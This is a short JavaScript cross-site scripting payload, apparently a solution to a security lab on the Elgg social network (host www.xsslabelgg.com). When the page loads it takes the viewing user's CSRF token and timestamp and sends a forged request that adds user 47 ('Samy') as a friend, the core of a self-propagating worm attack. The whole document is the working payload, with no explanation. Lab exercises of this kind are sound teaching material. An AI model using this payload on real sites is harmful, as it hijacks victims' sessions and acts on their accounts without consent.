<script type="text/javascript">
	window.onload = function () {
	var Ajax=null;
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
	var guid = elgg.session.user.guid;
    console.log(token);
	//Construct the HTTP request to add Samy as a friend.
    var sendurl= "/action/friends/add?friend=47"+ts+token+ts+token; //FILL IN

	//Create and send Ajax request to add friend
	if(guid!=47)
		{
		Ajax=new XMLHttpRequest();
		Ajax.open("GET",sendurl,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
		Ajax.send();
		}

	}
</script>
